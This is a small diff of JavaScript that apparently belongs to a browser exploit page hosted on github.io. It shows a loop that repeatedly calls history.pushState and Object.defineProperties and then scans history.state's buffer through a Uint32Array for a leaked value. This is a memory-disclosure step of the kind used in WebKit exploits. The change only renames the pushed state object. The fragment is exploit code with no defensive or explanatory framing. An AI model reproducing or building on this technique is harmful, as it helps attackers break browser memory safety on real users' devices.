@@ -145,7 +145,7 @@ var foundIndex=0;
 var maxCount=256;
 while(foundLeak==undefined&&maxCount>0){
 maxCount--;
-history.pushState(state1,'','mahamadoumgs.github.io/index.html');
+history.pushState(y,'','mahamadoumgs.github.io/index.html');
 Object.defineProperties({},props);
 var leak=new Uint32Array(history.state.data.buffer);
 for(var i=0;i<leak.length-6;i++){
